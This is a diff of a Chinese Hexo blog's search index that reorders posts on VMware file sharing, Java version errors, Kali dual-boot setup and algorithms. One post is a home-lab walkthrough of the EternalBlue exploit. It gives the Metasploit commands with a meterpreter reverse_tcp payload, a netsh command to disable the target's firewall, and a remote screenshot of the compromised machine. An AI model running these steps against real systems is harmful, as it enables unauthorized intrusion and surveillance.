@@ -1,27 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>VMware中的虚拟机与宿主机的文件共享</title>
-    <url>/2021/06/10/VMware%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
-    <content><![CDATA[<h1 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h1><h2 id="目前我知道的有如下几种方法"><a href="#目前我知道的有如下几种方法" class="headerlink" title="目前我知道的有如下几种方法"></a>目前我知道的有如下几种方法</h2><ol>
-<li><p>使用VMware Tools（这种方法功能很多，具体见下图，但由于本人尝试过很次，总是出现一些问题，所以本文暂不对此方法进行说明，等以后空闲时间在尝试摸索一番）</p>
-</li>
-<li><p>使用U盘（此方法较为简单，只是需要借助一个U盘）</p>
-</li>
-<li><p>建立共享文件夹（此方法也很简单，不需要借助其它设备，也不需要下载其他软件、插件）</p>
-</li>
-</ol>
-<h1 id="建立共享文件夹——方法阐述"><a href="#建立共享文件夹——方法阐述" class="headerlink" title="建立共享文件夹——方法阐述"></a>建立共享文件夹——方法阐述</h1><h2 id="步骤解析（来一波图片！）"><a href="#步骤解析（来一波图片！）" class="headerlink" title="步骤解析（来一波图片！）"></a>步骤解析（来一波图片！）</h2><p><img src="https://i.loli.net/2021/06/10/xBfFhSciIqE3QuC.png" alt="屏幕截图 2021-06-10 232743.png"><br><img src="https://i.loli.net/2021/06/10/8zA1hcRYtsSlqkX.png" alt="屏幕截图 2021-06-10 232628.png"></p>
-<p>下面这张图里选择的文件夹可以自己新建一个，比如就命名为“虚拟机共享文件夹”</p>
-<p><img src="https://i.loli.net/2021/06/10/avGApILn6HzRd5T.png" alt="屏幕截图 2021-06-10 232931.png"><br><img src="https://i.loli.net/2021/06/10/HPwhbdTkRf1XGVK.png" alt="屏幕截图 2021-06-10 233006.png"></p>
-<p>下面这张图里，根据个人所需设置，后期可以随时修改</p>
-<p><img src="https://i.loli.net/2021/06/10/KSz2lj5fxg1OYGQ.png" alt="屏幕截图 2021-06-10 233033.png"></p>
-<h2 id="虚拟机查看路径"><a href="#虚拟机查看路径" class="headerlink" title="虚拟机查看路径"></a>虚拟机查看路径</h2><p>在虚拟机里默认保存的地点路径如下：（再来一波图！）<br><img src="https://i.loli.net/2021/06/10/OBQWMaYqED7esdn.png" alt="屏幕截图 2021-06-10 233146.png"><br><img src="https://i.loli.net/2021/06/10/lf6HQ5ZSW7obnm2.png" alt="屏幕截图 2021-06-10 233212.png"><br><img src="https://i.loli.net/2021/06/10/tsArNLxDKh8vm7I.png" alt="屏幕截图 2021-06-10 233231.png"><br><img src="https://i.loli.net/2021/06/10/AijaIbQu5tCVLYk.png" alt="屏幕截图 2021-06-10 233246.png"></p>
-<p><strong>共享的文件夹的路径是：/mnt/hgfs</strong></p>
-<p>好了，下面虚拟机和宿主机就可以通过这个文件夹进行信息、文件等交流啦！</p>
-]]></content>
-  </entry>
-  <entry>
     <title>MyEclipse——jdk版本不支持</title>
     <url>/2021/05/29/MyEclipse%E2%80%94%E2%80%94jdk%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/</url>
     <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><ul>
@@ -49,6 +28,27 @@ version of the Java Runtime only recognizes class file versions up to 55.0
 <p>②将编译器版本改为自己想要使用的版本（与上面设置的那个版本相同就行了），点击Apply应用结束</p>
 <h3 id="修改效果"><a href="#修改效果" class="headerlink" title="修改效果"></a>修改效果</h3><p>编译运行成功</p>
 <p><img src="https://i.loli.net/2021/05/29/ETzhQY87PFvcbfO.png" alt="屏幕截图 2021-05-29 152341.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>VMware中的虚拟机与宿主机的文件共享</title>
+    <url>/2021/06/10/VMware%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
+    <content><![CDATA[<h1 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h1><h2 id="目前我知道的有如下几种方法"><a href="#目前我知道的有如下几种方法" class="headerlink" title="目前我知道的有如下几种方法"></a>目前我知道的有如下几种方法</h2><ol>
+<li><p>使用VMware Tools（这种方法功能很多，具体见下图，但由于本人尝试过很次，总是出现一些问题，所以本文暂不对此方法进行说明，等以后空闲时间在尝试摸索一番）</p>
+</li>
+<li><p>使用U盘（此方法较为简单，只是需要借助一个U盘）</p>
+</li>
+<li><p>建立共享文件夹（此方法也很简单，不需要借助其它设备，也不需要下载其他软件、插件）</p>
+</li>
+</ol>
+<h1 id="建立共享文件夹——方法阐述"><a href="#建立共享文件夹——方法阐述" class="headerlink" title="建立共享文件夹——方法阐述"></a>建立共享文件夹——方法阐述</h1><h2 id="步骤解析（来一波图片！）"><a href="#步骤解析（来一波图片！）" class="headerlink" title="步骤解析（来一波图片！）"></a>步骤解析（来一波图片！）</h2><p><img src="https://i.loli.net/2021/06/10/xBfFhSciIqE3QuC.png" alt="屏幕截图 2021-06-10 232743.png"><br><img src="https://i.loli.net/2021/06/10/8zA1hcRYtsSlqkX.png" alt="屏幕截图 2021-06-10 232628.png"></p>
+<p>下面这张图里选择的文件夹可以自己新建一个，比如就命名为“虚拟机共享文件夹”</p>
+<p><img src="https://i.loli.net/2021/06/10/avGApILn6HzRd5T.png" alt="屏幕截图 2021-06-10 232931.png"><br><img src="https://i.loli.net/2021/06/10/HPwhbdTkRf1XGVK.png" alt="屏幕截图 2021-06-10 233006.png"></p>
+<p>下面这张图里，根据个人所需设置，后期可以随时修改</p>
+<p><img src="https://i.loli.net/2021/06/10/KSz2lj5fxg1OYGQ.png" alt="屏幕截图 2021-06-10 233033.png"></p>
+<h2 id="虚拟机查看路径"><a href="#虚拟机查看路径" class="headerlink" title="虚拟机查看路径"></a>虚拟机查看路径</h2><p>在虚拟机里默认保存的地点路径如下：（再来一波图！）<br><img src="https://i.loli.net/2021/06/10/OBQWMaYqED7esdn.png" alt="屏幕截图 2021-06-10 233146.png"><br><img src="https://i.loli.net/2021/06/10/lf6HQ5ZSW7obnm2.png" alt="屏幕截图 2021-06-10 233212.png"><br><img src="https://i.loli.net/2021/06/10/tsArNLxDKh8vm7I.png" alt="屏幕截图 2021-06-10 233231.png"><br><img src="https://i.loli.net/2021/06/10/AijaIbQu5tCVLYk.png" alt="屏幕截图 2021-06-10 233246.png"></p>
+<p><strong>共享的文件夹的路径是：/mnt/hgfs</strong></p>
+<p>好了，下面虚拟机和宿主机就可以通过这个文件夹进行信息、文件等交流啦！</p>
 ]]></content>
   </entry>
   <entry>
@@ -116,21 +116,36 @@ bool isMonotonic(int* A, int ASize) &#123;
 ]]></content>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/04/26/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <title>小新在windows10上安装kali双系统</title>
+    <url>/2021/06/08/%E5%B0%8F%E6%96%B0%E5%9C%A8windows10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%8F%8C%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol>
+<li>腾出一个分区（此步骤可以放到最后去做）</li>
+<li>kali镜像文件</li>
+<li>帮助格式化和创建可引导USB闪存盘的工具：Rufus（建议直接在官网下载，也可以使用其他工具）</li>
+<li> U盘（8G以上，用于担当第二步的启动盘）</li>
+</ol>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h2 id="第一步：下载kali镜像文件"><a href="#第一步：下载kali镜像文件" class="headerlink" title="第一步：下载kali镜像文件"></a>第一步：下载kali镜像文件</h2><ul>
+<li>下载地址：<a href="https://mirrors.cloud.tencent.com/">腾讯软件源</a></li>
+<li>进入其中后，找到想要安装的系统（我安装的是kali）<br><img src="https://i.loli.net/2021/06/08/nFlYvH9jQAWyTPD.png" alt="1.png"></li>
+<li>选择想要下载版本<br><img src="https://i.loli.net/2021/06/08/ScBTMGYtQfe6Lox.png" alt="2.png"><br><img src="https://i.loli.net/2021/06/08/be2yF86HOcXupAi.png" alt="3.png"></li>
+</ul>
+<h2 id="第二步：下载Rufus软件"><a href="#第二步：下载Rufus软件" class="headerlink" title="第二步：下载Rufus软件"></a>第二步：下载Rufus软件</h2><ul>
+<li>下载地址：<a href="https://rufus.en.softonic.com/download">Rufus</a>（注意留心一下下载的是否是Rufus）<br><img src="https://i.loli.net/2021/06/08/6IHjQ51l4yXUAbC.png" alt="4.png"></li>
+</ul>
+<h2 id="第三步：制作启动U盘"><a href="#第三步：制作启动U盘" class="headerlink" title="第三步：制作启动U盘"></a>第三步：制作启动U盘</h2><ol>
+<li>打开下载好的Rufus<br><img src="https://i.loli.net/2021/06/08/HTLQY5zCsFGBgNw.png" alt="5.png"></li>
+<li>①处会自动识别出电脑中的U盘<br>②处选择第一步中下载好的镜像文件<br>点击③处的开始<br><img src="https://i.loli.net/2021/06/08/1uTJPcrgxW7qdh9.png" alt="6.png"></li>
+<li>在下面的图片中选择第二个（否则，后面可能找不到启动U盘）<br><img src="https://i.loli.net/2021/06/08/YSNxpogmcQL54Mi.png" alt="7.png"></li>
+</ol>
+<h2 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h2><ol>
+<li>进入控制面板<br><img src="https://i.loli.net/2021/06/08/QJkTiyUZfojElts.png" alt="8.png"></li>
+<li>按照下面的步骤依次操作<br><img src="https://i.loli.net/2021/06/08/Hity41vR2ej6LFC.png" alt="9.png"></li>
+<li>进入到磁盘管理界面，选择需要分盘的盘符，右击-&gt;<br><img src="https://i.loli.net/2021/06/08/q5A4SyZLXnf3N2g.png" alt="10.png"></li>
+<li>根据需要输入大小-&gt;压缩<br><img src="https://i.loli.net/2021/06/08/ypHz9oXc4MTegYS.png" alt="11.png"></li>
+<li>在如下图中新出现的位置右击-&gt;新建简单券<br><img src="https://i.loli.net/2021/06/08/2QzbU3ZIlExNdwc.png" alt="12.png"></li>
+<li>一直下一步,直到完成(除了下图中的位置需要根据需要设置)<br><img src="https://i.loli.net/2021/06/08/KDdwISRWX3l1Y72.png" alt="13.png"></li>
+<li>分区结束</li>
+</ol>
 ]]></content>
   </entry>
   <entry>
@@ -178,6 +193,24 @@ return 0;
 ]]></content>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2021/04/26/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>背包算法</title>
     <url>/2021/05/27/%E8%83%8C%E5%8C%85%E7%AE%97%E6%B3%95/</url>
     <content><![CDATA[<h2 id="例题分析-gt-共同特性（理解重点）"><a href="#例题分析-gt-共同特性（理解重点）" class="headerlink" title="例题分析-&gt;共同特性（理解重点）"></a>例题分析-&gt;共同特性（理解重点）</h2><blockquote>
@@ -199,56 +232,6 @@ return 0;
 </li>
 </ol>
 <h3 id="dp二维数组如下："><a href="#dp二维数组如下：" class="headerlink" title="dp二维数组如下："></a>dp二维数组如下：</h3>]]></content>
-  </entry>
-  <entry>
-    <title>虚拟机之间的入侵——永恒之蓝</title>
-    <url>/2021/05/23/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%A5%E4%BE%B5%E2%80%94%E2%80%94%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
-    <content><![CDATA[<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>1.进入虚拟机，查看两台虚拟机的IP地址，输入命令行如下：<br>    <code>ifconfig</code>  //这是在kali虚拟机中查看IP地址的命令<br><strong>效果如下图所示</strong><br><img src="https://i.loli.net/2021/05/23/1GTF679moSNYIL5.png" alt="屏幕截图 2021-05-23 175940.png"></p>
-<pre><code>`ipconfig`  //这是在Windows中的查看IP地址的命令
-</code></pre>
-<p><strong>效果如图</strong><br><img src="https://i.loli.net/2021/05/23/mKGT52szxED4j6C.png" alt="1.png"></p>
-<p>2.在kali虚拟集中依次输入如下命令：<br>    msfconsole                //打开”美少妇”）<br>    use exploit/multi/handler<br>    use exploit/windows/smb/ms17_010_eternalblue<br>    set payload windows/x64/meterpreter/reverse_tcp<br>    set RHOST 192.168.<em>.</em>      //（目标机的IP地址）<br>    run<br><strong>效果如图所示即表示成功</strong><br><img src="https://i.loli.net/2021/05/23/mvCJyDIMUHRo8pb.png" alt="屏幕截图 2021-05-23 204741.png"></p>
-<blockquote>
-<p>如若失败，则可能需要对目标虚拟机进行以下操作<br> 使用管理员省份打开cmd，输入以下代码</p>
-<p><code>netsh advfirewall set allprofiles state off</code></p>
-<p><strong>效果应该如图所示，出现“确定”即为成功</strong><br><img src="https://i.loli.net/2021/05/23/Fzc4wAVqdGKS1bZ.png" alt="屏幕截图 2021-05-23 205802.png"></p>
-</blockquote>
-<p>3.举例：控制对方的电脑截个屏，并获取照片<br>    screenshot        //截屏<br><img src="https://i.loli.net/2021/05/23/nlOxuUZqJvpBANT.png" alt="屏幕截图 2021-05-23 210457.png"></p>
-<p>图片文件保存的路径在命令行中显示的地址处，如下：<br><img src="https://i.loli.net/2021/05/23/cAqGLFyilZboErQ.png" alt="屏幕截图 2021-05-23 210920.png"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>小新在windows10上安装kali双系统</title>
-    <url>/2021/06/08/%E5%B0%8F%E6%96%B0%E5%9C%A8windows10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%8F%8C%E7%B3%BB%E7%BB%9F/</url>
-    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol>
-<li>腾出一个分区（此步骤可以放到最后去做）</li>
-<li>kali镜像文件</li>
-<li>帮助格式化和创建可引导USB闪存盘的工具：Rufus（建议直接在官网下载，也可以使用其他工具）</li>
-<li> U盘（8G以上，用于担当第二步的启动盘）</li>
-</ol>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h2 id="第一步：下载kali镜像文件"><a href="#第一步：下载kali镜像文件" class="headerlink" title="第一步：下载kali镜像文件"></a>第一步：下载kali镜像文件</h2><ul>
-<li>下载地址：<a href="https://mirrors.cloud.tencent.com/">腾讯软件源</a></li>
-<li>进入其中后，找到想要安装的系统（我安装的是kali）<br><img src="https://i.loli.net/2021/06/08/nFlYvH9jQAWyTPD.png" alt="1.png"></li>
-<li>选择想要下载版本<br><img src="https://i.loli.net/2021/06/08/ScBTMGYtQfe6Lox.png" alt="2.png"><br><img src="https://i.loli.net/2021/06/08/be2yF86HOcXupAi.png" alt="3.png"></li>
-</ul>
-<h2 id="第二步：下载Rufus软件"><a href="#第二步：下载Rufus软件" class="headerlink" title="第二步：下载Rufus软件"></a>第二步：下载Rufus软件</h2><ul>
-<li>下载地址：<a href="https://rufus.en.softonic.com/download">Rufus</a>（注意留心一下下载的是否是Rufus）<br><img src="https://i.loli.net/2021/06/08/6IHjQ51l4yXUAbC.png" alt="4.png"></li>
-</ul>
-<h2 id="第三步：制作启动U盘"><a href="#第三步：制作启动U盘" class="headerlink" title="第三步：制作启动U盘"></a>第三步：制作启动U盘</h2><ol>
-<li>打开下载好的Rufus<br><img src="https://i.loli.net/2021/06/08/HTLQY5zCsFGBgNw.png" alt="5.png"></li>
-<li>①处会自动识别出电脑中的U盘<br>②处选择第一步中下载好的镜像文件<br>点击③处的开始<br><img src="https://i.loli.net/2021/06/08/1uTJPcrgxW7qdh9.png" alt="6.png"></li>
-<li>在下面的图片中选择第二个（否则，后面可能找不到启动U盘）<br><img src="https://i.loli.net/2021/06/08/YSNxpogmcQL54Mi.png" alt="7.png"></li>
-</ol>
-<h2 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h2><ol>
-<li>进入控制面板<br><img src="https://i.loli.net/2021/06/08/QJkTiyUZfojElts.png" alt="8.png"></li>
-<li>按照下面的步骤依次操作<br><img src="https://i.loli.net/2021/06/08/Hity41vR2ej6LFC.png" alt="9.png"></li>
-<li>进入到磁盘管理界面，选择需要分盘的盘符，右击-&gt;<br><img src="https://i.loli.net/2021/06/08/q5A4SyZLXnf3N2g.png" alt="10.png"></li>
-<li>根据需要输入大小-&gt;压缩<br><img src="https://i.loli.net/2021/06/08/ypHz9oXc4MTegYS.png" alt="11.png"></li>
-<li>在如下图中新出现的位置右击-&gt;新建简单券<br><img src="https://i.loli.net/2021/06/08/2QzbU3ZIlExNdwc.png" alt="12.png"></li>
-<li>一直下一步,直到完成(除了下图中的位置需要根据需要设置)<br><img src="https://i.loli.net/2021/06/08/KDdwISRWX3l1Y72.png" alt="13.png"></li>
-<li>分区结束</li>
-</ol>
-]]></content>
   </entry>
   <entry>
     <title>计算机执行所生成的jar文件报错：版本不支持</title>
@@ -299,6 +282,23 @@ return 0;
 <h3 id="效果如图"><a href="#效果如图" class="headerlink" title="效果如图"></a>效果如图</h3><p>会发现此时的编译版本和运行版本都变成了jdk11了<br><img src="https://i.loli.net/2021/06/11/SewUKAoyj2qgRrY.png" alt="屏幕截图 2021-06-11 223533.png"><br>此时再运行一下之前生成的jar文件，就执行成功啦，嘿嘿！<br><img src="https://i.loli.net/2021/06/11/8mYHXxQC3ubLgzv.png" alt="屏幕截图 2021-06-11 223635.png"></p>
 <p>到这就成功啦！！</p>
 <p>喝彩！！ </p>
+]]></content>
+  </entry>
+  <entry>
+    <title>虚拟机之间的入侵——永恒之蓝</title>
+    <url>/2021/05/23/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%A5%E4%BE%B5%E2%80%94%E2%80%94%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
+    <content><![CDATA[<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>1.进入虚拟机，查看两台虚拟机的IP地址，输入命令行如下：<br>    <code>ifconfig</code>  //这是在kali虚拟机中查看IP地址的命令<br><strong>效果如下图所示</strong><br><img src="https://i.loli.net/2021/05/23/1GTF679moSNYIL5.png" alt="屏幕截图 2021-05-23 175940.png"></p>
+<pre><code>`ipconfig`  //这是在Windows中的查看IP地址的命令
+</code></pre>
+<p><strong>效果如图</strong><br><img src="https://i.loli.net/2021/05/23/mKGT52szxED4j6C.png" alt="1.png"></p>
+<p>2.在kali虚拟集中依次输入如下命令：<br>    msfconsole                //打开”美少妇”）<br>    use exploit/multi/handler<br>    use exploit/windows/smb/ms17_010_eternalblue<br>    set payload windows/x64/meterpreter/reverse_tcp<br>    set RHOST 192.168.<em>.</em>      //（目标机的IP地址）<br>    run<br><strong>效果如图所示即表示成功</strong><br><img src="https://i.loli.net/2021/05/23/mvCJyDIMUHRo8pb.png" alt="屏幕截图 2021-05-23 204741.png"></p>
+<blockquote>
+<p>如若失败，则可能需要对目标虚拟机进行以下操作<br> 使用管理员省份打开cmd，输入以下代码</p>
+<p><code>netsh advfirewall set allprofiles state off</code></p>
+<p><strong>效果应该如图所示，出现“确定”即为成功</strong><br><img src="https://i.loli.net/2021/05/23/Fzc4wAVqdGKS1bZ.png" alt="屏幕截图 2021-05-23 205802.png"></p>
+</blockquote>
+<p>3.举例：控制对方的电脑截个屏，并获取照片<br>    screenshot        //截屏<br><img src="https://i.loli.net/2021/05/23/nlOxuUZqJvpBANT.png" alt="屏幕截图 2021-05-23 210457.png"></p>
+<p>图片文件保存的路径在命令行中显示的地址处，如下：<br><img src="https://i.loli.net/2021/05/23/cAqGLFyilZboErQ.png" alt="屏幕截图 2021-05-23 210920.png"></p>
 ]]></content>
   </entry>
 </search>
